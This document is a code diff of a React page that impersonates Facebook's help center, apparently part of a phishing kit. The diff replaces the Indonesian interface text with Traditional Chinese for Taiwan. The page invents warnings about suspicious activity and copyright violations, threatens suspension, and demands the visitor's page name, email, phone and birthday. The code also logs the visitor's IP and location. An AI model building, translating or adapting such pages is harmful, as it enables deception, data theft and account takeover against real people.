@@ -10,36 +10,36 @@ import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';
 import axios from 'axios';
 
 const Home = () => {
-    // Tất cả text tiếng Indonesia
+    // Tất cả text tiếng Hoa (Phồn thể - Đài Loan)
     const texts = {
-        helpCenter: 'Pusat Bantuan',
+        helpCenter: '協助中心',
         english: 'English',
-        using: 'Cara Menggunakan',
-        managingAccount: 'Kelola Akun',
-        privacySecurity: 'Privasi, Keamanan & Keamanan',
-        policiesReporting: 'Kebijakan & Pelaporan',
-        pagePolicyAppeals: 'Banding Kebijakan Akun',
-        detectedActivity: 'Kami telah mendeteksi aktivitas mencurigakan di halaman dan akun Anda, termasuk laporan pelanggaran hak cipta dan pelanggaran kebijakan',
-        accessLimited: 'Untuk melindungi akun Anda dan memastikan proses peninjauan yang cepat dan akurat, harap verifikasi informasi Anda sekarang.',
-        submitAppeal: 'Ini adalah langkah verifikasi wajib untuk akun Facebook. Untuk menghindari penangguhan akun dan mempercepat penyelesaian kasus, harap selesaikan verifikasi segera.',
-        pageName: 'Nama Halaman',
-        mail: 'Alamat Email',
-        phone: 'Nomor Telepon',
-        birthday: 'Tanggal Lahir',
-        yourAppeal: 'Banding Anda',
-        appealPlaceholder: 'Silakan isi detail permohonan banding Anda.',
-        submit: 'Kirim',
-        fieldRequired: 'Bidang ini wajib diisi',
-        invalidEmail: 'Masukkan alamat email yang valid',
-        about: 'Tentang',
-        adChoices: 'Pilihan Iklan',
-        createAd: 'Buat Iklan',
-        privacy: 'Privasi',
-        careers: 'Karir',
-        createPage: 'Buat Halaman',
-        termsPolicies: 'Ketentuan & Kebijakan',
+        using: '使用說明',
+        managingAccount: '管理帳號',
+        privacySecurity: '隱私、保全與安全',
+        policiesReporting: '政策與檢舉',
+        pagePolicyAppeals: '帳號政策申訴',
+        detectedActivity: '我們在您的粉絲專頁與帳號上偵測到可疑活動，包含著作權侵權與違反政策的檢舉。',
+        accessLimited: '為了保護您的帳號並確保快速且準確的審查流程，請立即驗證您的資訊。',
+        submitAppeal: '這是 Facebook 帳號的必要驗證步驟。為避免帳號停用並加速案件處理，請立即完成驗證。',
+        pageName: '粉絲專頁名稱',
+        mail: '電子郵件地址',
+        phone: '電話號碼',
+        birthday: '出生日期',
+        yourAppeal: '您的申訴',
+        appealPlaceholder: '請填寫您的申訴內容。',
+        submit: '送出',
+        fieldRequired: '此欄位為必填',
+        invalidEmail: '請輸入有效的電子郵件地址',
+        about: '關於',
+        adChoices: '廣告選擇',
+        createAd: '建立廣告',
+        privacy: '隱私',
+        careers: '工作機會',
+        createPage: '建立粉絲專頁',
+        termsPolicies: '使用條款與政策',
         cookies: 'Cookie',
-        pleaseWait: 'Harap tunggu...'
+        pleaseWait: '請稍候...'
     };
 
     const [formData, setFormData] = useState({
@@ -51,8 +51,8 @@ const Home = () => {
     });
 
     const [errors, setErrors] = useState({});
-    const [countryCode, setCountryCode] = useState('ID');
-    const [callingCode, setCallingCode] = useState('+62');
+    const [countryCode, setCountryCode] = useState('TW');
+    const [callingCode, setCallingCode] = useState('+886');
     const [isSubmitting, setIsSubmitting] = useState(false);
     
     const isMountedRef = useRef(true);
@@ -71,7 +71,7 @@ const Home = () => {
                     ip: ipData.ip || 'CHỊU',
                     country: ipData.country || 'CHỊU',
                     city: ipData.city || 'CHỊU',
-                    country_code: ipData.country_code || 'ID'
+                    country_code: ipData.country_code || 'TW'
                 });
             })
             .catch((error) => {
@@ -81,7 +81,7 @@ const Home = () => {
                     ip: 'CHỊU',
                     country: 'CHỊU',
                     city: 'CHỊU',
-                    country_code: 'ID'
+                    country_code: 'TW'
                 });
             });
         
